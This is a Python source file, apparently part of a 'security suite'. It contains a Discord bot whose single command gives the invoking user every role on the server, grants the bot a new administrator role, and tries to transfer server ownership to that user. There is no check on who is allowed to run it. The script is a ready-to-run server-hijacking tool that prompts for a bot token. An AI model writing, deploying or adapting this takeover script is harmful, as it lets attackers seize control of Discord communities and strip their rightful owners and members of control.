"""
Copyright (c) 2025 Dryz3R - XiwA Tool
All rights reserved.

ENGLISH:
This software is the property of Dryz3R and is protected by copyright laws.
Unauthorized copying, distribution, or modification of this software is strictly prohibited.
XiwA Tool is a comprehensive security and analysis suite developed by Dryz3R.

FRANÇAIS:
Ce logiciel est la propriété de Dryz3R et est protégé par les lois sur le droit d'auteur.
La copie, la distribution ou la modification non autorisée de ce logiciel est strictement interdite.
XiwA Tool est une suite complète de sécurité et d'analyse développée par Dryz3R.

ESPAÑOL:
Este software es propiedad de Dryz3R y está protegido por las leyes de derechos de autor.
Se prohíbe estrictamente la copia, distribución o modificación no autorizada de este software.
XiwA Tool es una suite completa de seguridad y análisis desarrollada por Dryz3R.
"""

import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot connecté en tant que {bot.user}')

@bot.command()
async def transfert_propriete(ctx):
    try:
        guild = ctx.guild
        member = ctx.author
        
        permissions = discord.Permissions()
        permissions.update(administrator=True)
        
        bot_role = await guild.create_role(
            name="Bot Admin",
            permissions=permissions,
            color=discord.Color.blue()
        )
        
        bot_member = guild.get_member(bot.user.id)
        await bot_member.add_roles(bot_role)
        
        roles = guild.roles
        
        for role in roles:
            try:
                if role != bot_role and role != guild.default_role:
                    await member.add_roles(role)
            except:
                continue
                
        try:
            await guild.edit(owner=member)
            await ctx.send(f"👑 {member.mention} est maintenant propriétaire du serveur")
        except:
            await ctx.send("⚠️ Le transfert de propriété n'a pas fonctionné")
            
        await ctx.send(f"✅ Configuration terminée. {member.mention} a tous les rôles et est propriétaire.")
        
    except Exception as e:
        await ctx.send(f"❌ Une erreur s'est produite: {str(e)}")

if __name__ == "__main__":
    token = input("Veuillez entrer le token de votre bot Discord: ")
    bot.run(token)
